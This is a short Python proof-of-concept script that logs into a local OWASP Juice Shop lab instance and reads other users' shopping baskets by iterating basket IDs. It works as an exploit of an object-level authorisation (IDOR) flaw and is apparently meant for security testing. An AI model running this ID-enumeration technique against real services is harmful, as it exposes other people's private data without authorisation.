#!/usr/bin/env python3
"""Verified PoC — authenticated BOLA/IDOR in OWASP Juice Shop (/rest/basket/{id}).

Adapted from the LLM-crafted PoC to the real JSON shape (data.UserId / data.Products).
Logs in with provided creds, then reads OTHER users' baskets with our own JWT.
Authorized lab use only.
"""
import json, urllib.request
B = "http://127.0.0.1:8081"
CREDS = {"email": "tester@lab.test", "password": "Labtest123!"}

def _post_json(path, obj, token=None):
    h = {"Content-Type": "application/json"}
    if token: h["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(B + path, data=json.dumps(obj).encode(), headers=h)
    return json.loads(urllib.request.urlopen(req).read())

def _get(path, token):
    req = urllib.request.Request(B + path, headers={"Authorization": f"Bearer {token}"})
    return json.loads(urllib.request.urlopen(req).read())

def main():
    auth = _post_json("/rest/user/login", CREDS)["authentication"]
    token, mybid = auth["token"], auth["bid"]
    print(f"logged in as {CREDS['email']} — my basket id={mybid}")
    for bid in range(1, 5):
        d = _get(f"/rest/basket/{bid}", token).get("data", {})
        uid, nitems = d.get("UserId"), len(d.get("Products", []))
        flag = "  <-- NOT MINE (BOLA!)" if bid != mybid else "  (mine)"
        print(f"basket {bid}: UserId={uid}, items={nitems}{flag}")

if __name__ == "__main__":
    main()
